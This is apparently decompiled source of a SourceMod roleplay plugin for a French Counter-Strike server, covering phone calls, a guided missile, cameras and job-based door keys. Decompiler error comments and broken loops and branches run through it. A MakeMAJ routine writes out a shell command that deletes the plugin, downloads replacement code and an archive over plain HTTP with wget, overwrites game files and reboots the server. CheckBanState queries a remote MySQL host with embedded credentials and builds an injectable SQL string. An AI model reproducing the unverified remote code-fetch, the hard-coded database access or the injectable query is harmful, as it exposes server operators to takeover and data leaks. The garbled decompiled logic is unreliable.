{
	new var1;
	if (Client)
	{
		if (Connected[Player][0][0])
		{
			PrintToChat(Client, "[L-RP] %N est deja en conversation.", Player);
		}
		Connected[Client] = Player;
		Connected[Player] = Client;
		PrintToChat(Client, "[L-RP] Vous appelez %N...", Player);
		RecieveCall(Player);
		TimeOut[Client] = 40;
		CreateTimer(1, TimeOutCall, Client, 0);
	}
	return 0;
}

RecieveCall(Client)
{
	EmitSoundToClient(Client, "roleplay/ring.wav", -2, 5, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
	PrintToChat(Client, "[L-RP] Votre telephone sonne, tapez /decrocher pour prendre l'appel.");
	TimeOut[Client] = 40;
	CreateTimer(1, TimeOutRecieve, Client, 0);
	return 0;
}

Answer(Client)
{
	new var1;
	if (!Answered[Client][0][0])
	{
		new Player = Connected[Client][0][0];
		PrintToChat(Client, "[L-RP] Vous avez repondu a l'appel de %N", Player);
		PrintToChat(Player, "[L-RP] %N a repondu a l'appel", Client);
		Answered[Client] = 1;
		Answered[Player] = 1;
		StopSound(Client, 5, "roleplay/ring.wav");
	}
	else
	{
		if (Answered[Client][0][0])
		{
			PrintToChat(Client, "[L-RP] Vous etes deja en communication.");
		}
		PrintToChat(Client, "[L-RP] Personne ne vous appel!");
	}
	return 0;
}

public ClientOk(Client)
{
	new var1;
	if (IsClientConnected(Client))
	{
		if (!IsFakeClient(Client))
		{
			if (GetClientTeam(Client) != 1)
			{
				return 1;
			}
		}
	}
	return 0;
}

public SpawnCamAndAttach(Client, Ragdoll)
{
	decl String:StrModel[64];
	Format(StrModel, 64, "models/blackout.mdl");
	PrecacheModel(StrModel, true);
	decl String:StrName[64];
	Format(StrName, 64, "fpd_Ragdoll%d", Client);
	DispatchKeyValue(Ragdoll, "targetname", StrName);
	new Entity = CreateEntityByName("prop_dynamic", -1);
	if (Entity == -1)
	{
		return 0;
	}
	decl String:StrEntityName[64];
	Format(StrEntityName, 64, "fpd_RagdollCam%d", Entity);
	DispatchKeyValue(Entity, "targetname", StrEntityName);
	DispatchKeyValue(Entity, "parentname", StrName);
	DispatchKeyValue(Entity, "model", StrModel);
	DispatchKeyValue(Entity, "solid", "0");
	DispatchKeyValue(Entity, "rendermode", "10");
	DispatchKeyValue(Entity, "disableshadows", "1");
	decl Float:angles[3];
	GetClientEyeAngles(Client, angles);
	decl String:CamTargetAngles[64];
	Format(CamTargetAngles, 64, "%f %f %f", angles, angles[1], angles[2]);
	DispatchKeyValue(Entity, "angles", CamTargetAngles);
	SetEntityModel(Entity, StrModel);
	DispatchSpawn(Entity);
	SetVariantString(StrName);
	AcceptEntityInput(Entity, "SetParent", Entity, Entity, 0);
	SetVariantString("forward");
	AcceptEntityInput(Entity, "SetParentAttachment", Entity, Entity, 0);
	AcceptEntityInput(Entity, "TurnOn", -1, -1, 0);
	SetClientViewEntity(Client, Entity);
	ClientCamera[Client] = Entity;
	return 1;
}

public ClientConVar(QueryCookie:cookie, Client, ConVarQueryResult:result, String:cvarName[], String:cvarValue[])
{
	if (0 < StringToInt(cvarValue, 10))
	{
		CL_Ragdoll[Client] = 1;
	}
	else
	{
		CL_Ragdoll[Client] = 0;
	}
	return 0;
}

public ClearCam(Client)
{
	new var1;
	if (ClientCamera[Client][0][0])
	{
		SetClientViewEntity(Client, Client);
		ClientCamera[Client] = 0;
	}
	return 0;
}

HangUp(Client)
{
	if (Connected[Client][0][0])
	{
		new Player = Connected[Client][0][0];
		PrintToChat(Client, "[L-RP] Vous raccrocher a %N", Player);
		PrintToChat(Player, "[L-RP] %N a raccroche", Client);
		Connected[Client] = 0;
		Answered[Client] = 0;
		Connected[Player] = 0;
		Answered[Player] = 0;
		StopSound(Client, 5, "roleplay/ring.wav");
	}
	else
	{
		PrintToChat(Client, "[L-RP] Vous n'etes pas en conversation telephonique");
	}
	return 0;
}

PrintSilentChat(Client, String:ClientName[32], Player, String:Message[32], String:Arg[256])
{
	PrintToChat(Client, "(%s) %s: %s", Message, ClientName, Arg);
	PrintToChat(Player, "(%s) %s: %s", Message, ClientName, Arg);
	return 0;
}

TVMissile(client)
{
	decl Float:clienteyeangle[3];
	decl Float:anglevector[3];
	decl Float:clienteyeposition[3];
	decl Float:resultposition[3];
	decl entity;
	GetClientEyeAngles(client, clienteyeangle);
	GetClientEyePosition(client, clienteyeposition);
	GetAngleVectors(clienteyeangle, anglevector, NULL_VECTOR, NULL_VECTOR);
	NormalizeVector(anglevector, anglevector);
	AddVectors(clienteyeposition, anglevector, resultposition);
	NormalizeVector(anglevector, anglevector);
	ScaleVector(anglevector, 1500);
	entity = CreateEntityByName("hegrenade_projectile", -1);
	SetEntityMoveType(entity, MoveType:4);
	if (entity != -1)
	{
		SetEntPropEnt(entity, PropType:0, "m_hOwnerEntity", client, 0);
		SetEntProp(entity, PropType:1, "m_takedamage", any:0, 4, 0);
		DispatchSpawn(entity);
		decl Float:vecmax[3];
		decl Float:vecmin[3];
		SetEntPropVector(entity, PropType:0, "m_vecMins", vecmin, 0);
		SetEntPropVector(entity, PropType:0, "m_vecMaxs", vecmax, 0);
		SetEntPropEnt(entity, PropType:0, "m_hOwnerEntity", client, 0);
		SetEntityModel(entity, "models/weapons/w_missile_launch.mdl");
		TeleportEntity(entity, resultposition, clienteyeangle, anglevector);
		new gascloud = CreateEntityByName("env_rockettrail", -1);
		DispatchKeyValueVector(gascloud, "Origin", resultposition);
		DispatchKeyValueVector(gascloud, "Angles", clienteyeangle);
		decl Float:smokecolor[3];
		SetEntPropVector(gascloud, PropType:0, "m_StartColor", smokecolor, 0);
		SetEntPropFloat(gascloud, PropType:0, "m_Opacity", 0.5, 0);
		SetEntPropFloat(gascloud, PropType:0, "m_SpawnRate", 100, 0);
		SetEntPropFloat(gascloud, PropType:0, "m_ParticleLifetime", 0.5, 0);
		SetEntPropFloat(gascloud, PropType:0, "m_StartSize", 5, 0);
		SetEntPropFloat(gascloud, PropType:0, "m_EndSize", 30, 0);
		SetEntPropFloat(gascloud, PropType:0, "m_SpawnRadius", 0, 0);
		SetEntPropFloat(gascloud, PropType:0, "m_MinSpeed", 0, 0);
		SetEntPropFloat(gascloud, PropType:0, "m_MaxSpeed", 10, 0);
		SetEntPropFloat(gascloud, PropType:0, "m_flFlareScale", 1, 0);
		DispatchSpawn(gascloud);
		decl String:steamid[64];
		GetClientAuthString(client, steamid, 64);
		Format(steamid, 64, "%s%f", steamid, GetGameTime());
		DispatchKeyValue(entity, "targetname", steamid);
		SetVariantString(steamid);
		AcceptEntityInput(gascloud, "SetParent", -1, -1, 0);
		SetEntPropEnt(entity, PropType:0, "m_hEffectEntity", gascloud, 0);
		EmitSoundToAll("weapons/rpg/rocketfire1.wav", client, 0, 75, 0, 1, 100, -1, clienteyeposition, NULL_VECTOR, true, 0);
		SDKHook(entity, SDKHookType:8, TVMissileTouchHook);
		SDKHook(entity, SDKHookType:2, TVMissileDamageHook);
		SetEntProp(entity, PropType:1, "m_takedamage", any:2, 4, 0);
		decl Float:angle[3];
		angle[0] = -6;
		angle[1] = GetRandomFloat(-2, 2);
		makeviewpunch(client, angle);
		SetEntProp(client, PropType:0, "m_iFOV", any:60, 4, 0);
		decl String:entIndex[8];
		IntToString(client, entIndex, 5);
		SetEntProp(client, PropType:0, "m_iObserverMode", any:1, 4, 0);
		new tv = CreateEntityByName("point_viewcontrol", -1);
		DispatchKeyValue(tv, "spawnflags", "72");
		DispatchKeyValue(client, "targetname", entIndex);
		DispatchSpawn(tv);
		SetVariantString(steamid);
		AcceptEntityInput(tv, "Enable", client, tv, 0);
		gTVMissile[client] = entity;
		gTV[client] = tv;
		SDKHook(client, SDKHookType:4, OnPreThinkTVMissile);
	}
	else
	{
		LogError("TVMissile(...)->Unable to create TV-Missile");
	}
	return 0;
}

public OnPreThinkTVMissile(client)
{
	if (IsClientInGame(client))
	{
		if (IsPlayerAlive(client))
		{
			new var1;
			if (IsValidEdict(gTVMissile[client][0][0]))
			{
				decl Float:cleyeangle[3];
				decl Float:rocketposition[3];
				decl Float:vecangle[3];
				GetClientEyeAngles(client, cleyeangle);
				GetEntPropVector(gTVMissile[client][0][0], PropType:0, "m_vecOrigin", rocketposition, 0);
				vecangle[0] = cleyeangle[0];
				vecangle[1] = cleyeangle[1];
				vecangle[2] = cleyeangle[2];
				GetAngleVectors(vecangle, vecangle, NULL_VECTOR, NULL_VECTOR);
				NormalizeVector(vecangle, vecangle);
				ScaleVector(vecangle, 800);
				AddVectors(rocketposition, vecangle, rocketposition);
				TeleportEntity(gTVMissile[client][0][0], NULL_VECTOR, cleyeangle, vecangle);
				GetEntPropVector(gTVMissile[client][0][0], PropType:0, "m_vecOrigin", rocketposition, 0);
				TeleportEntity(gTV[client][0][0], rocketposition, cleyeangle, NULL_VECTOR);
				if (gNextPickup[client][0][0] < GetGameTime())
				{
					gNextPickup[client] = 0.5 + GetGameTime();
					new i = 1;
					while (i < MaxClients)
					{
						new var2;
						if (IsClientInGame(i))
						{
							GetClientEyePosition(i, rocketposition);
							TE_SetupGlowSprite(rocketposition, gMarkerSprite, 0.5, 1, 255);
							TE_SendToClient(client, 0);
							i++;
						}
						i++;
					}
				}
			}
			else
			{
				SDKUnhook(client, SDKHookType:4, OnPreThinkTVMissile);
				TVMissileResetClientView(client);
			}
		}
		SDKUnhook(client, SDKHookType:4, OnPreThinkTVMissile);
		TVMissileResetClientView(client);
		TVMissileActive(gTVMissile[client][0][0]);
	}
	return 0;
}

public Action:TVMissileTouchHook(entity, other)
{
	if (other)
	{
		if (!IsEntityCollidable(other, true, true, true))
		{
			return Action:0;
		}
	}
	TVMissileActive(entity);
	return Action:0;
}

public Action:TVMissileDamageHook(entity, &attacker, &inflictor, &Float:damage, &damagetype)
{
	if (GetEntProp(entity, PropType:1, "m_takedamage", 4, 0) == 2)
	{
		TVMissileActive(entity);
	}
	return Action:0;
}

TVMissileResetClientView(client)
{
	SetEntProp(client, PropType:0, "m_iObserverMode", any:0, 4, 0);
	SetEntProp(client, PropType:0, "m_bDrawViewmodel", any:1, 4, 0);
	SetEntPropEnt(client, PropType:0, "m_hObserverTarget", client, 0);
	SetEntProp(client, PropType:0, "m_iFOV", any:90, 4, 0);
	SDKUnhook(client, SDKHookType:4, OnPreThinkTVMissile);
	new var1;
	if (IsValidEdict(gTV[client][0][0]))
	{
		AcceptEntityInput(gTV[client][0][0], "Disable", -1, -1, 0);
		RemoveEntity(gTV[client][0][0], 0);
	}
	return 0;
}

TVMissileActive(entity)
{
	SDKUnhook(entity, SDKHookType:8, TVMissileTouchHook);
	SDKUnhook(entity, SDKHookType:2, TVMissileDamageHook);
	new var1;
	if (IsValidEdict(entity))
	{
		decl Float:entityposition[3];
		GetEntPropVector(entity, PropType:0, "m_vecOrigin", entityposition, 0);
		new client = GetEntPropEnt(entity, PropType:0, "m_hOwnerEntity", 0);
		new gasentity = GetEntPropEnt(entity, PropType:0, "m_hEffectEntity", 0);
		AcceptEntityInput(gasentity, "kill", -1, -1, 0);
		AcceptEntityInput(entity, "Kill", -1, -1, 0);
		entityposition[2] = 15 + entityposition[2];
		new var2;
		if (IsClientInGame(client))
		{
			var2 = client;
		}
		else
		{
			var2 = 0;
		}
		makeexplosion(var2, -1, entityposition, "", 200, 0, 0, 0);
		EmitSoundToAll("weapons/explode3.wav", 0, 0, 75, 0, 1, 100, -1, entityposition, NULL_VECTOR, true, 0);
		TVMissileResetClientView(client);
	}
	return 0;
}

makeviewpunch(client, Float:angle[3])
{
	decl Float:oldangle[3];
	GetEntPropVector(client, PropType:0, "m_vecPunchAngle", oldangle, 0);
	oldangle[0] = oldangle[0] + angle[0];
	oldangle[1] = oldangle[1] + angle[1];
	oldangle[2] = oldangle[2] + angle[2];
	SetEntPropVector(client, PropType:0, "m_vecPunchAngle", oldangle, 0);
	SetEntPropVector(client, PropType:0, "m_vecPunchAngleVel", angle, 0);
	return 0;
}

bool:makeexplosion(attacker, inflictor, Float:attackposition[3], String:weaponname[], magnitude, radiusoverride, Float:damageforce, flags)
{
	new explosion = CreateEntityByName("env_explosion", -1);
	if (explosion != -1)
	{
		DispatchKeyValueVector(explosion, "Origin", attackposition);
		decl String:intbuffer[64];
		IntToString(magnitude, intbuffer, 64);
		DispatchKeyValue(explosion, "iMagnitude", intbuffer);
		if (0 < radiusoverride)
		{
			IntToString(radiusoverride, intbuffer, 64);
			DispatchKeyValue(explosion, "iRadiusOverride", intbuffer);
		}
		if (damageforce > 0)
		{
			DispatchKeyValueFloat(explosion, "DamageForce", damageforce);
		}
		if (flags)
		{
			IntToString(flags, intbuffer, 64);
			DispatchKeyValue(explosion, "spawnflags", intbuffer);
		}
		if (!StrEqual(weaponname, "", false))
		{
			DispatchKeyValue(explosion, "classname", weaponname);
		}
		DispatchSpawn(explosion);
		if (IsClientInGame(attacker))
		{
			SetEntPropEnt(explosion, PropType:0, "m_hOwnerEntity", attacker, 0);
		}
		if (inflictor != -1)
		{
			SetEntPropEnt(explosion, PropType:1, "m_hInflictor", inflictor, 0);
		}
		AcceptEntityInput(explosion, "Explode", -1, -1, 0);
		AcceptEntityInput(explosion, "Kill", -1, -1, 0);
		return true;
	}
	return false;
}


/* ERROR! Unrecognized opcode: genarray_z */
 function "GetCommunityIDString" (number 234)
bool:IsEntityCollidable(entity, bool:includeplayer, bool:includehostage, bool:includeprojectile)
{
	decl String:classname[64];
	GetEdictClassname(entity, classname, 64);
	new var1;
	if (StrEqual(classname, "player", false))
	{
		return true;
	}
	return false;
}

RemoveEntity(entity, Float:time)
{
	if (0 == time)
	{
		if (IsValidEntity(entity))
		{
			decl String:edictname[32];
			GetEdictClassname(entity, edictname, 32);
			if (StrEqual(edictname, "player", true))
			{
				KickClient(entity, "");
			}
			else
			{
				AcceptEntityInput(entity, "kill", -1, -1, 0);
			}
		}
	}
	else
	{
		CreateTimer(time, RemoveEntityTimer, entity, 2);
	}
	return 0;
}

MakeMAJ()
{
	decl String:Command[512];
	decl String:PluginName[128];
	GetPluginFilename(Handle:0, PluginName, 128);
	Format(Command, 512, "rm cstrike/addons/sourcemod/plugins/%s && wget http://sphex.fr/roleplay/updates/Roleplay.smx && mv Roleplay.smx cstrike/addons/sourcemod/plugins/Roleplay.smx", PluginName);
	RunCommand(Command);
	Format(Command, 512, "wget http://sphex.fr/roleplay/updates/Roleplay.tar.gz && tar xvf Roleplay.tar.gz && cd Roleplay && cp -r ./* ../cstrike && cd ../ && rm -r Roleplay && rm Roleplay.tar.gz", "1.2.5");
	RunCommand(Command);
	new i = 0;
	while (i < 500)
	{
		PrintToChatAll("[ATTENTION] Le serveur va redemarrer suite a une mise a jour du mode !");
		i++;
	}
	ServerCommand("sm_reboot");
	return 0;
}

public bool:CheckBanState(String:SteamID[])
{
	decl String:buffer[256];
	decl String:TempSteamID[64];
	new Handle:kv = CreateKeyValues("rpboutique", "", "");
	KvSetString(kv, "driver", "mysql");
	KvSetString(kv, "host", "sphex.fr");
	KvSetString(kv, "database", "Boutique");
	KvSetString(kv, "user", "roleplay");
	KvSetString(kv, "pass", abc);
	KvSetString(kv, "port", "3306");
	decl String:error[256];
	new Handle:dbBanList = SQL_ConnectCustom(kv, error, 255, false);
	CloseHandle(kv);
	Format(buffer, 255, "SELECT * FROM `RP_Banlist` WHERE STEAMID = '%s';", SteamID);
	new Handle:query = SQL_Query(dbBanList, buffer, -1);
	if (SQL_GetRowCount(query))
	{
		while (SQL_FetchRow(query))
		{
			SQL_FetchString(query, 0, TempSteamID, 64, 0);
		}
	}
	CloseHandle(query);
	CloseHandle(dbBanList);
	if (StrEqual(TempSteamID, SteamID, true))
	{
		return true;
	}
	return false;
}


/* ERROR! Index was outside the bounds of the array. */
 function "StartRoleplay" (number 239)
LockDoors()
{
	decl String:mapname[128];
	GetCurrentMap(mapname, 128);
	new entity = -1;
	new var10 = FindEntityByClassname(entity, "func_door");
	entity = var10;
	while (var10 != -1)
	{
		new EntHammerId = Entity_GetHammerId(entity);
		decl String:entity_name[128];
		Entity_GetName(entity, entity_name, 128);
		if (StrEqual(mapname, "oviscity_r_03", true))
		{
			new var1;
			if (EntHammerId == 6543)
			{
				AcceptEntityInput(entity, "Unlock", -1, -1, 0);
			}
			else
			{
				AcceptEntityInput(entity, "Lock", -1, -1, 0);
			}
		}
		else
		{
			new var2;
			if (StrEqual(mapname, "rp_riverside_b3", true))
			{
				new var3;
				if (EntHammerId == 1353543)
				{
					AcceptEntityInput(entity, "Lock", -1, -1, 0);
				}
				AcceptEntityInput(entity, "Unlock", -1, -1, 0);
			}
		}
	}
	new var11 = FindEntityByClassname(entity, "func_door_rotating");
	entity = var11;
	while (var11 != -1)
	{
		new EntHammerId = Entity_GetHammerId(entity);
		decl String:entity_name[128];
		Entity_GetName(entity, entity_name, 128);
		if (StrEqual(mapname, "oviscity_r_03", true))
		{
			new var4;
			if (EntHammerId == 4609)
			{
				AcceptEntityInput(entity, "Unlock", -1, -1, 0);
			}
			else
			{
				AcceptEntityInput(entity, "Lock", -1, -1, 0);
			}
		}
		else
		{
			new var5;
			if (StrEqual(mapname, "rp_riverside_b3", true))
			{
				new var6;
				if (EntHammerId == 254778)
				{
					AcceptEntityInput(entity, "Lock", -1, -1, 0);
				}
				AcceptEntityInput(entity, "Unlock", -1, -1, 0);
			}
		}
	}
	new var12 = FindEntityByClassname(entity, "prop_door_rotating");
	entity = var12;
	while (var12 != -1)
	{
		new EntHammerId = Entity_GetHammerId(entity);
		decl String:entity_name[128];
		Entity_GetName(entity, entity_name, 128);
		if (StrEqual(mapname, "oviscity_r_03", true))
		{
			new var7;
			if (EntHammerId == 4147)
			{
				AcceptEntityInput(entity, "Unlock", -1, -1, 0);
			}
			else
			{
				AcceptEntityInput(entity, "Lock", -1, -1, 0);
			}
		}
		else
		{
			new var8;
			if (StrEqual(mapname, "rp_riverside_b3", true))
			{
				new var9;
				if (EntHammerId == 82)
				{
					AcceptEntityInput(entity, "Lock", -1, -1, 0);
				}
				AcceptEntityInput(entity, "Unlock", -1, -1, 0);
			}
		}
	}
	return 0;
}

CanBeUnlockDoor(client, Ent)
{
	new EntHammerId = Entity_GetHammerId(Ent);
	decl String:entity_name[128];
	Entity_GetName(Ent, entity_name, 128);
	decl String:mapname[128];
	GetCurrentMap(mapname, 128);
	if (StrEqual(mapname, "oviscity_r_03", true))
	{
		new var3;
		if (StrEqual(entity_name, "house02_maindoor01", true))
		{
			UnlockDoor(client, Ent, true);
		}
		else
		{
			new var6;
			if (StrEqual(entity_name, "house02_topdoor012", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var9;
			if (StrEqual(entity_name, "house02_topdoor01", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var12;
			if (StrEqual(entity_name, "house02_bathdoor01", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var15;
			if (StrEqual(entity_name, "apt3_door", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var18;
			if (StrEqual(entity_name, "apt3_bal", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var21;
			if (EntHammerId == 4156)
			{
				UnlockDoor(client, Ent, true);
			}
			new var24;
			if (StrEqual(entity_name, "apt2_door", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var27;
			if (StrEqual(entity_name, "apt2_bal", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var30;
			if (EntHammerId == 4160)
			{
				UnlockDoor(client, Ent, true);
			}
			new var33;
			if (StrEqual(entity_name, "mapt1_door", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var36;
			if (StrEqual(entity_name, "mapt1_bath", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var39;
			if (StrEqual(entity_name, "mapt2_door", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var42;
			if (StrEqual(entity_name, "mapt2_bath", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var45;
			if (StrEqual(entity_name, "house01_maindoor01", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var48;
			if (StrEqual(entity_name, "house01_topdoor01b", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var51;
			if (StrEqual(entity_name, "house01_topdoor01", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var54;
			if (StrEqual(entity_name, "house01_bathdoor01", true))
			{
				UnlockDoor(client, Ent, true);
			}
			new var56;
			if (StrEqual(entity_name, "mapt_door", true))
			{
				UnlockDoor(client, Ent, true);
			}
			if (JobID[client][0][0] == 1)
			{
				new var57;
				if (StrEqual(entity_name, "pd_frontdoor1", true))
				{
					if (EntHammerId == 4844)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(4834, ""), false);
					}
					else
					{
						if (EntHammerId == 4834)
						{
							UnlockDoor(client, Ent, true);
							UnlockDoor(client, Entity_FindByHammerId(4844, ""), false);
						}
						UnlockDoor(client, Ent, true);
					}
				}
				else
				{
					new var59;
					if (RankID[client][0][0] != 2)
					{
						UnlockDoor(client, Ent, true);
					}
					new var60;
					if (RankID[client][0][0] == 1)
					{
						if (EntHammerId == 5761)
						{
							UnlockDoor(client, Ent, true);
							UnlockDoor(client, Entity_FindByHammerId(5762, ""), false);
						}
						else
						{
							if (EntHammerId == 5762)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(5761, ""), false);
							}
							if (EntHammerId == 5753)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(5755, ""), false);
							}
							if (EntHammerId == 5755)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(5753, ""), false);
							}
							if (EntHammerId == 197748)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(197753, ""), false);
							}
							if (EntHammerId == 197753)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(197748, ""), false);
							}
							if (EntHammerId == 88436)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(88441, ""), false);
							}
							if (EntHammerId == 88441)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(88436, ""), false);
							}
							if (EntHammerId == 6539)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(6543, ""), false);
							}
							if (EntHammerId == 6543)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(6539, ""), false);
							}
							if (EntHammerId == 4531)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4539, ""), false);
							}
							if (EntHammerId == 4539)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4531, ""), false);
							}
							if (EntHammerId == 121648)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(121653, ""), false);
							}
							if (EntHammerId == 121653)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(121648, ""), false);
							}
							if (EntHammerId == 4149)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4150, ""), false);
							}
							if (EntHammerId == 4150)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4149, ""), false);
							}
							if (EntHammerId == 4147)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4148, ""), false);
							}
							if (EntHammerId == 4148)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4147, ""), false);
							}
							if (EntHammerId == 4297)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4299, ""), false);
							}
							if (EntHammerId == 4299)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4297, ""), false);
							}
							if (EntHammerId == 4305)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4307, ""), false);
							}
							if (EntHammerId == 4307)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4305, ""), false);
							}
							if (EntHammerId == 129942)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(129947, ""), false);
							}
							if (EntHammerId == 129947)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(129942, ""), false);
							}
							if (EntHammerId == 5553)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(5559, ""), false);
							}
							if (EntHammerId == 5559)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(5553, ""), false);
							}
							if (EntHammerId == 269403)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(269408, ""), false);
							}
							if (EntHammerId == 269408)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(269403, ""), false);
							}
							if (EntHammerId == 4224)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4225, ""), false);
							}
							if (EntHammerId == 4225)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4224, ""), false);
							}
							if (EntHammerId == 4172)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4174, ""), false);
							}
							if (EntHammerId == 4174)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(4172, ""), false);
							}
							if (EntHammerId == 5568)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(5565, ""), false);
								UnlockDoor(client, Entity_FindByHammerId(5571, ""), false);
								UnlockDoor(client, Entity_FindByHammerId(5574, ""), false);
							}
							if (EntHammerId == 5565)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(5568, ""), false);
								UnlockDoor(client, Entity_FindByHammerId(5571, ""), false);
								UnlockDoor(client, Entity_FindByHammerId(5574, ""), false);
							}
							if (EntHammerId == 5571)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(5568, ""), false);
								UnlockDoor(client, Entity_FindByHammerId(5565, ""), false);
								UnlockDoor(client, Entity_FindByHammerId(5574, ""), false);
							}
							if (EntHammerId == 5574)
							{
								UnlockDoor(client, Ent, true);
								UnlockDoor(client, Entity_FindByHammerId(5568, ""), false);
								UnlockDoor(client, Entity_FindByHammerId(5565, ""), false);
								UnlockDoor(client, Entity_FindByHammerId(5571, ""), false);
							}
							UnlockDoor(client, Ent, true);
						}
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 2)
			{
				if (EntHammerId == 121653)
				{
					UnlockDoor(client, Ent, true);
					UnlockDoor(client, Entity_FindByHammerId(121648, ""), false);
				}
				else
				{
					if (EntHammerId == 121648)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(121653, ""), false);
					}
					new var61;
					if (StrEqual(entity_name, "hospitaldoor01", true))
					{
						UnlockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 3)
			{
				if (EntHammerId == 4224)
				{
					UnlockDoor(client, Ent, true);
					UnlockDoor(client, Entity_FindByHammerId(4225, ""), false);
				}
				else
				{
					if (EntHammerId == 4225)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(4224, ""), false);
					}
					if (EntHammerId == 4172)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(4174, ""), false);
					}
					if (EntHammerId == 4174)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(4172, ""), false);
					}
				}
			}
			if (JobID[client][0][0] == 4)
			{
				if (EntHammerId == 4857)
				{
					UnlockDoor(client, Ent, true);
					UnlockDoor(client, Entity_FindByHammerId(4861, ""), false);
				}
				else
				{
					if (EntHammerId == 4861)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(4857, ""), false);
					}
					if (StrEqual(entity_name, "court_door", true))
					{
						UnlockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 5)
			{
				if (EntHammerId == 198045)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					if (EntHammerId == 197748)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(197753, ""), false);
					}
					if (EntHammerId == 197753)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(197748, ""), false);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 6)
			{
				new var62;
				if (StrEqual(entity_name, "weapon_door", true))
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 7)
			{
				if (EntHammerId == 4297)
				{
					UnlockDoor(client, Ent, true);
					UnlockDoor(client, Entity_FindByHammerId(4299, ""), false);
				}
				else
				{
					if (EntHammerId == 4299)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(4297, ""), false);
					}
					if (EntHammerId == 4305)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(4307, ""), false);
					}
					if (EntHammerId == 4307)
					{
						UnlockDoor(client, Ent, true);
